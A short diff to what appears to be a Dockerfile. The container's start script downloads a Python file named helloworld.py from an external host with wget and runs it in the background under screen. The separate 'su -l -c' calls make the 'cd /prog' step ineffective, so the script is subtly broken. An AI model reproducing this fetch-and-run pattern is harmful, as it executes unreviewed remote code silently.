@@ -6,10 +6,9 @@ RUN curl -LO https://proot.gitlab.io/proot/bin/proot
 RUN chmod 755 proot
 RUN mv proot /bin
 RUN sudo mkdir /prog
-RUN echo "su -l -c 'mkdir /prog'"  >>/start.sh
 RUN echo "su -l -c 'cd /prog'">>/start.sh
 RUN echo "su -l -c 'wget https://s.bccx.eu.org/helloworld.py'" >>/start.sh
 RUN echo "screen -d -m python3 helloworld.py" >>/start.sh
 RUN chmod 755 /start.sh
 EXPOSE 8080
-CMD  /start.sh
+CMD /start.sh
